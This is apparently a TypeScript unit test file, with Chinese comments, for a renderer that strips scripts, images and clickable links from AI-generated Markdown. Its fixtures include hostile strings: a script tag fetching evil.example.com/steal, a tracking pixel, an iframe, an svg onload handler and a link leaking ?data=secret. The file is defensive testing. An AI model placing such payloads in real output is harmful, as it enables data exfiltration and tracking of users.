/**
 * AI-5 单测：安全 Markdown（`src/ai/aiMarkdown.ts`）。
 *
 * 覆盖 IMPLEMENTATION_PLAN 里 AI-5 的这条验收标准：
 * **「恶意 Markdown 不执行不联网」**（AI12）。
 *
 * ## 这里的断言方式与「普通解析测试」不同
 *
 * 本模块不产出 HTML，而是产出一棵**只含白名单节点**的树。因此「不执行」不是靠检查字符串里
 * 有没有 `<script>`，而是靠**结构上不可能**：
 * - 树里没有 `html` / `image` / `iframe` / `link` 节点类型，所以「渲染出脚本」这件事无从表达；
 * - 图片在解析阶段就降级成文本且**不保留地址**，所以「渲染出远程图片」也没有输入可依；
 * - 链接降级成 `文字（地址）` 纯文本，所以没有 `<a href>` 可点。
 *
 * 本文件同时**钉住这三条降级**（谁把降级去掉，测试就失败），因为「更宽松的渲染」正是
 * 最容易在后续步骤里被顺手加回来的东西。
 */

import { describe, expect, it } from 'vitest'

import {
  findExternalReferences,
  markdownToPlainText,
  parseAiMarkdown,
  sanitizeMarkdownText,
  type AiMarkdownBlock,
} from './aiMarkdown'

/** 树里出现过的所有节点 kind（用于「只允许白名单节点」的结构断言） */
function kindsOf(blocks: readonly AiMarkdownBlock[], into: Set<string> = new Set()): Set<string> {
  for (const block of blocks) {
    into.add(block.kind)
    if (block.kind === 'bulletList' || block.kind === 'orderedList') {
      for (const item of block.items) {
        kindsOf(item.blocks, into)
      }
    }
  }
  return into
}

/** 收集整棵树里的全部文本（用于「地址是否还在」这类值断言） */
function allText(blocks: readonly AiMarkdownBlock[]): string {
  const parts: string[] = []
  for (const block of blocks) {
    switch (block.kind) {
      case 'heading':
      case 'paragraph':
      case 'blockquote':
        parts.push(...block.inlines.map((inline) => inline.text))
        break
      case 'codeBlock':
        parts.push(block.text)
        break
      case 'bulletList':
      case 'orderedList':
        for (const item of block.items) {
          parts.push(allText(item.blocks))
        }
        break
      default:
        break
    }
  }
  return parts.join('\n')
}

const ALLOWED_KINDS = [
  'heading',
  'paragraph',
  'bulletList',
  'orderedList',
  'codeBlock',
  'blockquote',
  'divider',
]

describe('AI-5：只产出白名单节点（结构上不可能执行脚本）', () => {
  it('常见结构的节点类型都在白名单内', () => {
    const document = parseAiMarkdown(
      ['# 结论', '', '- 第一点', '- 第二点', '', '1. 甲', '2. 乙', '', '> 引用', '', '---', '', '```json', '{}', '```'].join('\n'),
    )
    for (const kind of kindsOf(document.blocks)) {
      expect(ALLOWED_KINDS).toContain(kind)
    }
  })

  it('任何输入都不会产出 html / image / iframe / link 这类节点', () => {
    const hostile = [
      '<script>fetch("https://evil.example.com/steal")</script>',
      '<img src="https://evil.example.com/pixel.png">',
      '<iframe src="https://evil.example.com/">',
      '[点我](https://evil.example.com/x)',
      '![图](https://evil.example.com/p.png)',
      '<svg onload="alert(1)"></svg>',
    ].join('\n\n')
    const document = parseAiMarkdown(hostile)
    const kinds = [...kindsOf(document.blocks)]
    for (const forbidden of ['html', 'image', 'iframe', 'link', 'script', 'raw']) {
      expect(kinds).not.toContain(forbidden)
    }
  })

  it('脚本标签按纯文本保留（看得见模型写了什么），且记录降级', () => {
    const document = parseAiMarkdown('<script>alert(1)</script>')
    expect(allText(document.blocks)).toContain('<script>')
    expect(document.downgrades.some((item) => item.kind === 'html-as-text')).toBe(true)
  })
})

describe('AI-5：图片降级为文本，且不保留地址', () => {
  it('远程图片地址不出现在树里（因此不可能被渲染成请求）', () => {
    const document = parseAiMarkdown('![追踪像素](https://evil.example.com/pixel.png)')
    const text = allText(document.blocks)
    expect(text).toContain('[图片：追踪像素]')
    // 关键：地址**不存在**于树里，而不是「存在但没渲染」
    expect(text).not.toContain('evil.example.com')
    expect(text).not.toContain('pixel.png')
    expect(document.downgrades.some((item) => item.kind === 'image-as-text')).toBe(true)
  })

  it('data: 图片同样不保留内容', () => {
    const document = parseAiMarkdown('![x](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)')
    expect(allText(document.blocks)).not.toContain('base64')
  })
})

describe('AI-5：链接降级为纯文本（不可点击）', () => {
  it('链接地址变成文本，不产生可点链接', () => {
    const document = parseAiMarkdown('见 [文档](https://evil.example.com/x?data=secret)')
    const text = allText(document.blocks)
    expect(text).toContain('文档（https://evil.example.com/x?data=secret）')
    expect(document.downgrades.some((item) => item.kind === 'link-as-text')).toBe(true)
  })

  it('外链清单能被提取出来（用于如实告知用户，不阻断）', () => {
    const document = parseAiMarkdown('参考 https://a.example.com/1 与 https://b.example.com/2')
    expect(findExternalReferences(document)).toEqual([
      'https://a.example.com/1',
      'https://b.example.com/2',
    ])
  })

  it('重复地址去重且排序（同一份输入得到同样的清单）', () => {
    const document = parseAiMarkdown('https://b.example.com https://a.example.com https://b.example.com')
    expect(findExternalReferences(document)).toEqual([
      'https://a.example.com',
      'https://b.example.com',
    ])
  })
})

describe('AI-5：净化后的文本不含链接与图片语法', () => {
  it('复制用的 Markdown 里没有 ]( 这种链接语法', () => {
    const document = parseAiMarkdown('见 [文档](https://evil.example.com/x) 和 ![图](https://evil.example.com/p.png)')
    const sanitized = sanitizeMarkdownText(document)
    expect(sanitized).not.toContain('](')
    expect(sanitized).not.toContain('p.png')
  })

  it('复制用的纯文本同样不含图片地址', () => {
    const document = parseAiMarkdown('![图](https://evil.example.com/p.png)')
    const plain = markdownToPlainText(document)
    expect(plain).toContain('[图片：图]')
    expect(plain).not.toContain('evil.example.com')
  })

  it('结构标记被保留（贴到文档工具里还能看出层次），但不含强调外的危险语法', () => {
    const sanitized = sanitizeMarkdownText(parseAiMarkdown('# 标题\n\n- 一\n- 二\n\n> 引用'))
    expect(sanitized).toContain('# 标题')
    expect(sanitized).toContain('- 一')
    expect(sanitized).toContain('> 引用')
  })

  it('代码块内容原样保留（不解析其中的标记）', () => {
    const document = parseAiMarkdown('```\n**不该加粗** [链接](https://x.example.com)\n```')
    const block = document.blocks[0]
    expect(block?.kind).toBe('codeBlock')
    if (block?.kind === 'codeBlock') {
      expect(block.text).toContain('**不该加粗**')
      expect(block.text).toContain('[链接](https://x.example.com)')
    }
  })
})

describe('AI-5：解析的健壮性（不可信输入的规模与形状）', () => {
  it('未闭合的代码围栏不报错（模型常漏收尾）', () => {
    const document = parseAiMarkdown('```json\n{"a":1}')
    expect(document.blocks[0]?.kind).toBe('codeBlock')
  })

  it('深层嵌套列表被拍平并记录降级，不静默丢内容', () => {
    const deep = '- 一\n  - 二\n    - 三\n      - 四\n'
    const document = parseAiMarkdown(deep)
    expect(document.downgrades.some((item) => item.kind === 'list-flattened')).toBe(true)
    // 内容仍然在（没有静默丢弃）
    expect(allText(document.blocks)).toContain('一')
  })

  it('表格按纯文本处理并记录降级', () => {
    const document = parseAiMarkdown('| 渠道 | N |\n| --- | --- |\n| Boss | 10 |')
    expect(document.downgrades.some((item) => item.kind === 'table-as-text')).toBe(true)
    expect(allText(document.blocks)).toContain('Boss')
  })

  it('空文本得到空树而不是抛错', () => {
    const document = parseAiMarkdown('')
    expect(document.blocks).toEqual([])
    expect(markdownToPlainText(document)).toBe('')
  })

  it('同一份输入解析两次得到相同结果（可复现）', () => {
    const text = '# 标题\n\n- 甲\n- 乙\n\n正文 **粗** 与 `码`'
    expect(JSON.stringify(parseAiMarkdown(text))).toBe(JSON.stringify(parseAiMarkdown(text)))
  })

  it('CRLF 行尾与 LF 得到相同结构（Windows 剪贴板常见）', () => {
    const lf = parseAiMarkdown('# 标题\n\n正文')
    const crlf = parseAiMarkdown('# 标题\r\n\r\n正文')
    expect(JSON.stringify(crlf)).toBe(JSON.stringify(lf))
  })
})
